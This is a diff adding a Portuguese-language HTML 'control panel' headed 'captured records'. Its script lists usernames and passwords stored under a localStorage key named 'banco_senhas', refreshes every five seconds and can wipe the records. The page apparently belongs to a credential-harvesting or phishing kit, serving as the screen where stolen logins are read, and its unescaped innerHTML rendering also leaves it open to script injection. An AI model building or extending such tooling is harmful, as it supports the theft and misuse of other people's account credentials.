@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Painel de Controle - Senhas</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #000; color: #0f0; padding: 20px; }
+        .painel { max-width: 800px; margin: auto; border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 15px #0f0; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { border: 1px solid #0f0; padding: 10px; text-align: left; }
+        th { background: #030; }
+        .clear-btn { background: red; color: white; border: none; padding: 10px; cursor: pointer; margin-top: 20px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="painel">
+        <h2>REGISTROS CAPTURADOS</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>Data</th>
+                    <th>Usuário</th>
+                    <th>Senha</th>
+                </tr>
+            </thead>
+            <tbody id="lista"></tbody>
+        </table>
+        <button class="clear-btn" onclick="limpar()">APAGAR TUDO</button>
+    </div>
+
+    <script>
+        function atualizar() {
+            const dados = JSON.parse(localStorage.getItem('banco_senhas')) || [];
+            const tabela = document.getElementById('lista');
+            tabela.innerHTML = dados.map(item => `
+                <tr>
+                    <td>${item.data}</td>
+                    <td>${item.usuario}</td>
+                    <td>${item.senha}</td>
+                </tr>
+            `).join('');
+        }
+
+        function limpar() {
+            if(confirm("Deseja apagar todos os registros?")) {
+                localStorage.removeItem('banco_senhas');
+                atualizar();
+            }
+        }
+
+        atualizar();
+        // Atualiza automaticamente a cada 5 segundos se a aba estiver aberta
+        setInterval(atualizar, 5000);
+    </script>
+</body>
+</html>
